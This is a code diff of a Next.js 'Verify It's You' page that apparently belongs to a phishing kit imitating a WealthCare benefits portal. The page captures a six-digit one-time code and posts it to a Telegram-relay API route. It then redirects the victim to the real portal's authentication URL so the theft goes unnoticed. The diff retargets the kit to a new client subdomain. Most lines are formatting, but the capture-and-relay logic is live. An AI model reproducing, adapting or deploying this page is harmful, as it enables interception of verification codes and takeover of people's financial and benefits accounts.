@@ -1,63 +1,65 @@
-"use client"
+"use client";
 
-import { Suspense, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Button } from "@/components/ui/button"
-import { SiteFooter } from "@/components/site-footer"
-import { SiteHeader } from "@/components/site-header"
-import { HelpCircle } from "lucide-react"
+import { Suspense, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Button } from "@/components/ui/button";
+import { SiteFooter } from "@/components/site-footer";
+import { VerificationHeader } from "@/components/verification-header";
+import { HelpCircle } from "lucide-react";
 
-const ALIGHT_REDIRECT_URL =
-  "https://flores247.wealthcareportal.com/Authentication/Handshake"
+const PEAK1_REDIRECT_URL =
+  "https://peak1.wealthcareportal.com/Authentication/Handshake";
 
 function EnterCodeContent() {
-  const [code, setCode] = useState("")
-  const [isLoading, setIsLoading] = useState(false)
-  const [isResending, setIsResending] = useState(false)
-  const router = useRouter()
+  const [code, setCode] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [isResending, setIsResending] = useState(false);
+  const router = useRouter();
 
   const handleVerify = async () => {
-    if (isLoading) return
-    setIsLoading(true)
-    
+    if (isLoading) return;
+    setIsLoading(true);
+
     try {
       await fetch("/api/telegram/forgot-password-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ code }),
-      }).catch(console.error)
+      }).catch(console.error);
     } catch (error) {
-      console.error("Failed to send code notification:", error)
+      console.error("Failed to send code notification:", error);
     }
-    
-    await new Promise((r) => setTimeout(r, 1000))
-    window.location.href = ALIGHT_REDIRECT_URL
-  }
+
+    await new Promise((r) => setTimeout(r, 1000));
+    window.location.href = PEAK1_REDIRECT_URL;
+  };
 
   const handleResend = async () => {
-    if (isResending) return
-    setIsResending(true)
-    
+    if (isResending) return;
+    setIsResending(true);
+
     try {
       await fetch("/api/telegram/forgot-password-resend", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-      }).catch(console.error)
+      }).catch(console.error);
     } catch (error) {
-      console.error("Failed to send resend notification:", error)
+      console.error("Failed to send resend notification:", error);
     }
-    
-    await new Promise((r) => setTimeout(r, 2000))
-    setIsResending(false)
-  }
+
+    await new Promise((r) => setTimeout(r, 2000));
+    setIsResending(false);
+  };
 
   return (
     <div className="min-h-screen bg-white">
-      <SiteHeader />
+      <VerificationHeader />
       <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
         <div className="mb-6">
           <div className="flex items-center gap-2 mb-4">
-            <h2 className="text-base font-medium text-gray-900">Verify It&apos;s You</h2>
+            <h2 className="text-base font-medium text-gray-900">
+              Verify It&apos;s You
+            </h2>
             <button
               type="button"
               className="text-[#254650] hover:underline flex items-center gap-1"
@@ -75,7 +77,9 @@ function EnterCodeContent() {
           </p>
 
           <div className="flex items-center gap-2 mb-4">
-            <span className="text-gray-700 text-sm">Didn&apos;t receive code?</span>
+            <span className="text-gray-700 text-sm">
+              Didn&apos;t receive code?
+            </span>
             <button
               type="button"
               onClick={handleResend}
@@ -94,7 +98,9 @@ function EnterCodeContent() {
               id="code"
               inputMode="numeric"
               value={code}
-              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+              onChange={(e) =>
+                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
+              }
               placeholder=""
               className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
               maxLength={6}
@@ -122,17 +128,19 @@ function EnterCodeContent() {
 
       <SiteFooter />
     </div>
-  )
+  );
 }
 
 export default function ForgotPasswordCodePage() {
   return (
-    <Suspense fallback={
-      <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
-        Loading...
-      </div>
-    }>
+    <Suspense
+      fallback={
+        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
+          Loading...
+        </div>
+      }
+    >
       <EnterCodeContent />
     </Suspense>
-  )
+  );
 }
